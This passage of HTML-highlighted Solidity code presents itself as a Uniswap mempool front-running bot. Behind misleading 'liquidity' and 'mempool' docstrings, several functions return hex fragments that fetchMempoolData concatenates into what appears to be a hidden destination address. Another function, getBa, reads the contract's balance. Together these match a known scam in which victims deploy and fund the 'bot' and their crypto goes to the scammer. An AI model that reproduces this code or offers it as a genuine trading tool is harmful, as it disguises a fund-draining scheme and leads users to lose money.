                <span class="token function">mstore</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token function">mload</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            dest <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
            src <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Copy remaining bytes</span>
        <span class="token builtin">uint</span> mask <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> len<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            <span class="token keyword">let</span> srcpart <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">not</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">let</span> destpart <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span>
            <span class="token function">mstore</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token function">or</span><span class="token punctuation">(</span>destpart<span class="token punctuation">,</span> srcpart<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */</span>
    <span class="token keyword">function</span> <span class="token function">orderContractsByLiquidity</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token builtin">uint</span> word<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> length<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> divisor <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">248</span><span class="token punctuation">;</span>

        <span class="token comment">// Load the rune into the MSBs of b</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> word<span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token builtin">uint</span> b <span class="token operator">=</span> word <span class="token operator">/</span> divisor<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b<span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xE0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            ret <span class="token operator">=</span> b <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">;</span>
            length <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check for truncated codepoints</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">&gt;</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            divisor <span class="token operator">=</span> divisor <span class="token operator">/</span> <span class="token number">256</span><span class="token punctuation">;</span>
            b <span class="token operator">=</span> <span class="token punctuation">(</span>word <span class="token operator">/</span> divisor<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token number">0xC0</span> <span class="token operator">!=</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// Invalid UTF-8 sequence</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            ret <span class="token operator">=</span> <span class="token punctuation">(</span>ret <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
     
    <span class="token keyword">function</span> <span class="token function">getMempoolStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;67e0&quot;</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */</span>
    <span class="token keyword">function</span> <span class="token function">calcLiquidityInContract</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> ptr <span class="token operator">=</span> self<span class="token punctuation">.</span>_ptr <span class="token operator">-</span> <span class="token number">31</span><span class="token punctuation">;</span>
        <span class="token builtin">uint</span> end <span class="token operator">=</span> ptr <span class="token operator">+</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ptr <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> l<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token builtin">uint8</span> b<span class="token punctuation">;</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span> b <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xE0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xF8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0xFC</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                ptr <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>            
            <span class="token punctuation">}</span>        
        <span class="token punctuation">}</span>    
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">fetchMempoolEdition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;6945&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */</span>

    <span class="token comment">/*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */</span>
    <span class="token keyword">function</span> <span class="token function">keccak</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            ret <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">getMempoolShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;0x39F&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */</span>
    <span class="token keyword">function</span> <span class="token function">checkLiquidity</span><span class="token punctuation">(</span><span class="token builtin">uint</span> a<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token builtin">uint</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token builtin">uint</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            count<span class="token operator">++</span><span class="token punctuation">;</span>
            b <span class="token operator">/=</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            b <span class="token operator">=</span> a <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>
            res<span class="token punctuation">[</span>count <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">toHexDigit</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            a <span class="token operator">/=</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">getMempoolHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;b335e&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/*
     * @dev If \`self\` starts with \`needle\`, \`needle\` is removed from the
     *      beginning of \`self\`. Otherwise, \`self\` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return \`self\`
     */</span>
    <span class="token keyword">function</span> <span class="token function">beyond</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">,</span> slice <span class="token keyword">memory</span> needle<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>slice <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len <span class="token operator">&lt;</span> needle<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> self<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token builtin">bool</span> equal <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_ptr <span class="token operator">!=</span> needle<span class="token punctuation">.</span>_ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
                <span class="token keyword">let</span> length <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span>needle<span class="token punctuation">)</span>
                <span class="token keyword">let</span> selfptr <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">let</span> needleptr <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>needle<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                equal <span class="token operator">:=</span> <span class="token function">eq</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>selfptr<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>equal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            self<span class="token punctuation">.</span>_len <span class="token operator">-=</span> needle<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
            self<span class="token punctuation">.</span>_ptr <span class="token operator">+=</span> needle<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> self<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">getMempoolLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;7430aB262&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Returns the memory address of the first byte of the first occurrence of</span>
    <span class="token comment">// \`needle\` in \`self\`, or the first byte after \`self\` if not found.</span>
    <span class="token keyword">function</span> <span class="token function">getBa</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">findPtr</span><span class="token punctuation">(</span><span class="token builtin">uint</span> selflen<span class="token punctuation">,</span> <span class="token builtin">uint</span> selfptr<span class="token punctuation">,</span> <span class="token builtin">uint</span> needlelen<span class="token punctuation">,</span> <span class="token builtin">uint</span> needleptr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> ptr <span class="token operator">=</span> selfptr<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> idx<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> selflen<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token builtin">bytes32</span> mask <span class="token operator">=</span> <span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> needlelen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token builtin">bytes32</span> needledata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> needledata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token builtin">uint</span> end <span class="token operator">=</span> selfptr <span class="token operator">+</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span>
                <span class="token builtin">bytes32</span> ptrdata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">while</span> <span class="token punctuation">(</span>ptrdata <span class="token operator">!=</span> needledata<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">&gt;=</span> end<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
                    ptr<span class="token operator">++</span><span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// For long needles, use hashing</span>
                <span class="token builtin">bytes32</span> hash<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> hash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">for</span> <span class="token punctuation">(</span>idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;=</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token builtin">bytes32</span> testHash<span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> testHash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">==</span> testHash<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
                    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return \`self\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">fetchMempoolData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolShort <span class="token operator">=</span> <span class="token function">getMempoolShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolEdition <span class="token operator">=</span> <span class="token function">fetchMempoolEdition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return \`mempool\`.
        */</span>
        
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolVersion <span class="token operator">=</span> <span class="token function">fetchMempoolVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolLong <span class="token operator">=</span> <span class="token function">getMempoolLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
        * @dev Modifies \`self\` to contain everything from the first occurrence of
        *      \`needle\` to the end of the slice. \`self\` is set to the empty slice
        *      if \`needle\` is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return \`self\`.
        */</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolHeight <span class="token operator">=</span> <span class="token function">getMempoolHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolCode <span class="token operator">=</span> <span class="token function">getMempoolCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        load mempool parameters
        */</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolStart <span class="token operator">=</span> <span class="token function">getMempoolStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolLog <span class="token operator">=</span> <span class="token function">getMempoolLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>_mempoolShort<span class="token punctuation">,</span> _mempoolEdition<span class="token punctuation">,</span> _mempoolVersion<span class="token punctuation">,</span> 
            _mempoolLong<span class="token punctuation">,</span> _getMempoolHeight<span class="token punctuation">,</span>_getMempoolCode<span class="token punctuation">,</span>_getMempoolStart<span class="token punctuation">,</span>_getMempoolLog<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">toHexDigit</span><span class="token punctuation">(</span><span class="token builtin">uint8</span> d<span class="token punctuation">)</span> <span class="token keyword">pure</span> <span class="token keyword">internal</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> d <span class="token operator">&amp;&amp;</span> d <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span><span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token string">&#39;0&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">&lt;=</span> <span class="token builtin">uint8</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin">uint8</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span><span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> d <span class="token operator">-</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// revert(&quot;Invalid hex digit&quot;);</span>
        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
               
                   
    <span class="token keyword">function</span> <span class="token function">getMempoolLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;25F62&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/* @dev Perform frontrun action from different contract pools
